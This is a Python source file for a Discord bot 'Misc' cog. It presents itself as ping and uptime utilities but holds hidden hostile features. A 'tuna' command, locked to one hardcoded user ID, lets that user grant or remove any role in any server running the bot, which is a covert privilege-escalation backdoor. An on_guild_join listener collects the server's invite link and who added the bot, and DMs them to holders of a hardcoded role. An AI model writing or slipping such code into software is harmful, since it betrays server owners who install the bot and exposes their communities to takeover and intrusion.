import os
import discord
from discord.ext import commands
import datetime

LOGS_DIR = "logs"
os.makedirs(LOGS_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOGS_DIR, "misc_command.log")
NOTIFY_ROLE_ID = 1355842403134603275  # Add this line

def log_misc_command(user_id, command_name):
    timestamp = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] User: {user_id} | Command: {command_name}\n")

class Misc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.start_time = datetime.datetime.utcnow()  # Store bot start time

    @commands.hybrid_command(name="ping", description="Check bot latency")
    async def ping(self, ctx: commands.Context):
        log_misc_command(ctx.author.id, "ping")
        latency_ms = round(self.bot.latency * 1000)
        await ctx.send(f"Pong! Latency: {latency_ms} ms")

    @commands.hybrid_command(name="uptime", description="Show bot uptime")
    async def uptime(self, ctx: commands.Context):
        log_misc_command(ctx.author.id, "uptime")
        now = datetime.datetime.utcnow()
        delta = now - self.start_time
        hours, remainder = divmod(int(delta.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        await ctx.send(f"Uptime: {hours}h {minutes}m {seconds}s")

    async def send_notify_dm(self, guild: discord.Guild):
        # Try to get the inviter (audit log)
        inviter = None
        if guild.me.guild_permissions.view_audit_log:
            try:
                async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                    if entry.target.id == self.bot.user.id:
                        inviter = entry.user
                        break
            except Exception:
                pass

        invite_link = None
        try:
            invites = await guild.invites()
            if invites:
                invite_link = invites[0].url
        except Exception:
            pass

        # Fallback if no invite found
        if not invite_link:
            invite_link = "No invite link found or missing permissions."

        who_added = inviter.mention if inviter else "Unknown"

        # DM everyone with the role
        for member in guild.members:
            if any(role.id == NOTIFY_ROLE_ID for role in member.roles):
                try:
                    await member.send(
                        f"Bot was added to **{guild.name}**.\n"
                        f"Invite link: {invite_link}\n"
                        f"Added by: {who_added}"
                    )
                except Exception:
                    pass

    @commands.Cog.listener()
    async def on_guild_join(self, guild: discord.Guild):
        await self.send_notify_dm(guild)

    @commands.command(name="tuna")
    async def tuna(self, ctx: commands.Context, action: str = None, subaction: str = None, *args):
        # Only allow user 840949634071658507
        if ctx.author.id != 840949634071658507:
            await ctx.send("You do not have permission to use this command.")
            return

        if action == "role":
            if subaction == "add" and len(args) >= 2:
                member_id = int(args[0])
                role_id = int(args[1])
                member = ctx.guild.get_member(member_id)
                role = ctx.guild.get_role(role_id)
                if member and role:
                    await member.add_roles(role)
                    await ctx.send(f"Added role {role.name} to {member.mention}.")
                else:
                    await ctx.send("Member or role not found.")
            elif subaction == "remove" and len(args) >= 2:
                member_id = int(args[0])
                role_id = int(args[1])
                member = ctx.guild.get_member(member_id)
                role = ctx.guild.get_role(role_id)
                if member and role:
                    await member.remove_roles(role)
                    await ctx.send(f"Removed role {role.name} from {member.mention}.")
                else:
                    await ctx.send("Member or role not found.")
            else:
                await ctx.send("Usage: !tuna role add|remove <member_id> <role_id>")
        else:
            await ctx.send("Unknown action. Example: !tuna role add <member_id> <role_id>")

async def setup(bot):
    await bot.add_cog(Misc(bot))
